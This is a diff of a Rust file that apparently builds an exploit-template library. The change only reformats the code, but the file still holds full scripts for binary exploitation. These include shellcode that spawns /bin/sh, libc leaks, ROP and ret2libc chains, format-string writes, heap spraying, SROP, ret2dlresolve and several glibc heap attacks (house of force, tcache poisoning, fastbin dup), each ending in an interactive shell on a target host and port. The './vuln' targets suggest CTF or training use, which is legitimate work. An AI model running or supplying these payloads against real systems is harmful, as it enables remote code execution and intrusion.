@@ -45,14 +45,18 @@ impl OneLinerLibrary {
     }
 
     pub fn get_shell(target: &str, port: u16) -> String {
-        format!(r#"let s = connect("{}", {})
+        format!(
+            r#"let s = connect("{}", {})
 let payload = shellcode("x64", "execve", "/bin/sh")
 send(s, payload)
-interactive(s)"#, target, port)
+interactive(s)"#,
+            target, port
+        )
     }
 
     pub fn leak_libc(target: &str, port: u16) -> String {
-        format!(r#"let s = connect("{}", {})
+        format!(
+            r#"let s = connect("{}", {})
 recv_until(s, ":")
 let leak = recv(s, 8)
 let leaked_addr = u64(leak)
@@ -64,11 +68,14 @@ if len(matches) > 0 {{
     print("Found libc: " + libc["id"])
     let libc_base = leaked_addr - libc["symbols"]["puts"]
     print("libc base @ 0x" + hex(libc_base))
-}}"#, target, port)
+}}"#,
+            target, port
+        )
     }
 
     pub fn rop_chain(target: &str, port: u16) -> String {
-        format!(r#"let s = connect("{}", {})
+        format!(
+            r#"let s = connect("{}", {})
 let binary = "./vuln"
 
 let pop_rdi = rop_find(binary, "pop rdi; ret")[0]["address"]
@@ -82,11 +89,14 @@ let binsh = libc_base + 0x1b3e9a
 
 let payload = cyclic(72) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
 send(s, payload)
-interactive(s)"#, target, port)
+interactive(s)"#,
+            target, port
+        )
     }
 
     pub fn ret2libc(target: &str, port: u16) -> String {
-        format!(r#"let s = connect("{}", {})
+        format!(
+            r#"let s = connect("{}", {})
 let binary = "./vuln"
 
 let offset = auto_offset(binary)
@@ -110,21 +120,27 @@ let binsh = libc_base + matches[0].symbols["str_bin_sh"]
 
 let payload2 = "A" * offset + p64(pop_rdi) + p64(binsh) + p64(system)
 send(s, payload2)
-interactive(s)"#, target, port)
+interactive(s)"#,
+            target, port
+        )
     }
 
     pub fn fmt_string_exploit(target: &str, port: u16) -> String {
-        format!(r#"let s = connect("{}", {})
+        format!(
+            r#"let s = connect("{}", {})
 let target_addr = 0x0804a000
 let target_value = 0xdeadbeef
 
 let payload = fmtstr_payload(6, {{target_addr: target_value}}, arch: "x86")
 send(s, payload)
-interactive(s)"#, target, port)
+interactive(s)"#,
+            target, port
+        )
     }
 
     pub fn heap_spray(target: &str, port: u16) -> String {
-        format!(r#"let s = connect("{}", {})
+        format!(
+            r#"let s = connect("{}", {})
 let shellcode = shellcode("x64", "execve", "/bin/sh")
 let nop_sled = "\x90" * 0x1000
 
@@ -134,11 +150,14 @@ for i in range(1000) {{
 
 let trigger = "TRIGGER\n"
 send(s, trigger)
-interactive(s)"#, target, port)
+interactive(s)"#,
+            target, port
+        )
     }
 
     pub fn buffer_overflow(target: &str, port: u16) -> String {
-        format!(r#"let s = connect("{}", {})
+        format!(
+            r#"let s = connect("{}", {})
 let binary = "./vuln"
 
 let offset = auto_offset(binary)
@@ -146,11 +165,14 @@ let win_addr = find_symbol(binary, "win")
 
 let payload = cyclic(offset) + p64(win_addr)
 send(s, payload)
-interactive(s)"#, target, port)
+interactive(s)"#,
+            target, port
+        )
     }
 
     pub fn stack_pivot(target: &str, port: u16) -> String {
-        format!(r#"let s = connect("{}", {})
+        format!(
+            r#"let s = connect("{}", {})
 let binary = "./vuln"
 
 let bss_addr = find_section(binary, ".bss")["address"] + 0x800
@@ -166,11 +188,14 @@ send(s, p64(bss_addr) + pack_addresses(rop_chain))
 
 let payload = cyclic(72) + p64(pop_rsp) + p64(bss_addr)
 send(s, payload)
-interactive(s)"#, target, port)
+interactive(s)"#,
+            target, port
+        )
     }
 
     pub fn sigrop(target: &str, port: u16) -> String {
-        format!(r#"let s = connect("{}", {})
+        format!(
+            r#"let s = connect("{}", {})
 let binary = "./vuln"
 
 let syscall_ret = rop_find(binary, "syscall; ret")[0]["address"]
@@ -186,11 +211,14 @@ let frame = sigreturn_frame({{
 
 let payload = cyclic(72) + p64(pop_rax) + p64(15) + p64(syscall_ret) + frame
 send(s, payload)
-interactive(s)"#, target, port)
+interactive(s)"#,
+            target, port
+        )
     }
 
     pub fn one_gadget(target: &str, port: u16) -> String {
-        format!(r#"let s = connect("{}", {})
+        format!(
+            r#"let s = connect("{}", {})
 let binary = "./vuln"
 
 let leak = u64(recv(s, 8))
@@ -200,11 +228,14 @@ let one_gadget = libc_base + 0x4f3d5
 
 let payload = cyclic(72) + p64(one_gadget)
 send(s, payload)
-interactive(s)"#, target, port)
+interactive(s)"#,
+            target, port
+        )
     }
 
     pub fn ret2dlresolve(target: &str, port: u16) -> String {
-        format!(r#"let s = connect("{}", {})
+        format!(
+            r#"let s = connect("{}", {})
 let binary = "./vuln"
 
 let plt0 = find_symbol(binary, "_PROCEDURE_LINKAGE_TABLE_")
@@ -214,11 +245,14 @@ let fake_reloc_offset = (bss - dynsym_addr) / 0x18
 
 let payload = cyclic(72) + p64(plt0) + p64(fake_reloc_offset) + fake_structures
 send(s, payload)
-interactive(s)"#, target, port)
+interactive(s)"#,
+            target, port
+        )
     }
 
     pub fn house_of_force(target: &str, port: u16) -> String {
-        format!(r#"let s = connect("{}", {})
+        format!(
+            r#"let s = connect("{}", {})
 
 send(s, "1\n")
 send(s, str(0x10) + "\n")
@@ -235,11 +269,14 @@ send(s, "1\n")
 send(s, "24\n")
 send(s, p64(target_got) + "\n")
 
-interactive(s)"#, target, port)
+interactive(s)"#,
+            target, port
+        )
     }
 
     pub fn house_of_spirit(target: &str, port: u16) -> String {
-        format!(r#"let s = connect("{}", {})
+        format!(
+            r#"let s = connect("{}", {})
 
 let fake_chunk = p64(0) + p64(0x71) + "A" * 0x60 + p64(0x70)
 send(s, fake_chunk)
@@ -249,11 +286,14 @@ send(s, "free\n")
 send(s, "malloc\n")
 send(s, p64(target_addr) + "\n")
 
-interactive(s)"#, target, port)
+interactive(s)"#,
+            target, port
+        )
     }
 
     pub fn tcache_poison(target: &str, port: u16) -> String {
-        format!(r#"let s = connect("{}", {})
+        format!(
+            r#"let s = connect("{}", {})
 
 for i in range(7) {{
     send(s, "alloc\n64\n")
@@ -269,11 +309,14 @@ send(s, "alloc\n64\n")
 send(s, "alloc\n64\n")
 send(s, "edit\n8\n" + payload + "\n")
 
-interactive(s)"#, target, port)
+interactive(s)"#,
+            target, port
+        )
     }
 
     pub fn fastbin_dup(target: &str, port: u16) -> String {
-        format!(r#"let s = connect("{}", {})
+        format!(
+            r#"let s = connect("{}", {})
 
 send(s, "alloc\n64\nA")
 send(s, "alloc\n64\nB")
@@ -288,11 +331,14 @@ send(s, "alloc\n64\nX")
 send(s, "alloc\n64\nY")
 send(s, "alloc\n64\n" + payload)
 
-interactive(s)"#, target, port)
+interactive(s)"#,
+            target, port
+        )
     }
 
     pub fn unsorted_bin_attack(target: &str, port: u16) -> String {
-        format!(r#"let s = connect("{}", {})
+        format!(
+            r#"let s = connect("{}", {})
 
 send(s, "alloc\n1024\nA")
 send(s, "alloc\n1024\nB")
@@ -303,6 +349,8 @@ send(s, "edit\n0\n" + "A" * 8 + p64(target_addr - 0x10))
 
 send(s, "alloc\n1024\nC")
 
-interactive(s)"#, target, port)
+interactive(s)"#,
+            target, port
+        )
     }
 }
